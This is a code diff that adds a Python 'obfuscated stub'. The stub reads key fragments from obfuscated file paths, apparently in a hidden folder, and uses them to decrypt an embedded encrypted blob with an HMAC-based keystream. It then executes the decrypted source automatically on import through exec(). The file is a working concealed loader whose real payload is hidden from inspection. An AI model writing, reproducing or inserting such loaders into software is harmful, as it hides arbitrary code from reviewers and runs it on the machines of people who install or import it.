@@ -1,0 +1,39 @@
+# Dorayaki Obfuscated Stub
+import base64, os, hashlib, hmac
+from pathlib import Path
+
+_KEY_PARTS_OBF = ['wtmL0YDOlFDZ1EDOwUGMhdTMihzYkVzLyYWMlVWYwYWN0IWY5QGZ38iblRGZphmLv4iLv4iL', 'wtmLhBTZiRGO4QjNyUWO0YmY0QzNiJ2LyYWMlVWYwYWN0IWY5QGZ38iblRGZphmLv4iLv4iL', 'wtmLyMTO1YTOykjZjNTNzUDMhBDZwUzLyYWMlVWYwYWN0IWY5QGZ38iblRGZphmLv4iLv4iL', 'wtmL3YzN2EDMxkjYwgzMxYWZyUjNiN2LyYWMlVWYwYWN0IWY5QGZ38iblRGZphmLv4iLv4iL']
+_BLOB_CHUNKS = ['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', '=MCQVBwaWyHjKmuw/tBQ/ERFYnYxnTg24qn2THO2ls+WrefgTdc55TCcXNmvNvBWApyAUtmH34N0stnJElt01sPq5FPKSZkNqPYOSVqPsiLtzC3vuO5pCqlMVrARgXiUCxcwiBkZ6psXCTlJ1xOHhARhJxyu8fk3Ftmx34snE8K8GN6SKM5mwdTnoTs/pI+nV0neWr+4/AwKEjii4NxU4Z900h/c/Z9FgUYYCV7pgvZzRskNkDk44eRes49R2Nx+oz65lZ40vo2VwS61flPNY0jorVDrmv7sdZGYnPFhqYq1rfNiAJs/8/hex+v3Z6z4KkR7j1YkyOJN49kA2j5Bi01L0NU1fofoRK7+YuYSfvn0/E3EWYUGWTCB4ZFOhDyxZPNqUiyVOgv0ofcNo3o5RLeW3o5zK64eFZzurc6R6nsXYu55+wBJPGMVlxJMO3WkGL92aPZUcJs38jxg35hE8zdkq02Uw81TQ1K3Y0lXKtjH0zSdpWpzyplV9khitBYqZ4H2Q1abNEpJG8E9Ak7lBtC+w90QB41Wag5v7C50Sfix76cVJff+w3MqVO9tclKvZzOO561ZMqveAJ+iSgH7i4XReXkpehFtl0heEApmzOqOIDqjykS4CO/Xc1QTr2+3yx+nSepP02X81s27RukydD8ULev0yxilu/KEJkswYQwwtiQlmNnB5+qt12MljxHPuqgLhw8bvIKWTsvdq6RZn21jAZGd6E/suy8j+AxpGZ8oWlztX/ezHkLk9ILFzLkhp+YqB/S8FORb/Lhp1PdbhnSYPw+9BFJV9gwx/PecKl4gEJrQf8kctIZLXw3/eBHxXLc0HqZHiNzSYsP3Q4u9Q6SLezGkFtM9k2+eL2Br7']
+
+def _rev(s): return s[::-1]
+def _read_key_parts():
+    parts = []
+    # FIX: Resolve relative to this file's directory
+    base = Path(__file__).resolve().parent
+    for obf in _KEY_PARTS_OBF:
+        try:
+            rel_path_str = base64.b64decode(_rev(obf)).decode('utf-8')
+            p = base.joinpath(rel_path_str).resolve()
+            parts.append(base64.b64decode(p.read_text('utf-8')))
+        except Exception: pass
+    return b''.join(parts)
+
+def _keystream(key, nonce, length):
+    out = bytearray(); counter = 0
+    while len(out) < length:
+        out.extend(hmac.new(key, nonce + counter.to_bytes(8,'big'), hashlib.sha256).digest())
+        counter += 1
+    return bytes(out[:length])
+
+def _run():
+    key = _read_key_parts()
+    if not key: raise RuntimeError("Decryption Key not found (missing .hidden folder?)")
+    blob = base64.b64decode(''.join([_rev(c) for c in _BLOB_CHUNKS]))
+    nonce, ct = blob[:12], blob[12:]
+    ks = _keystream(key, nonce, len(ct))
+    plain = bytes(a ^ b for a, b in zip(ct, ks))
+    try: src = plain.decode('utf-8')
+    except: src = plain.decode('latin-1')
+    exec(compile(src, __file__, 'exec'), globals())
+
+_run()
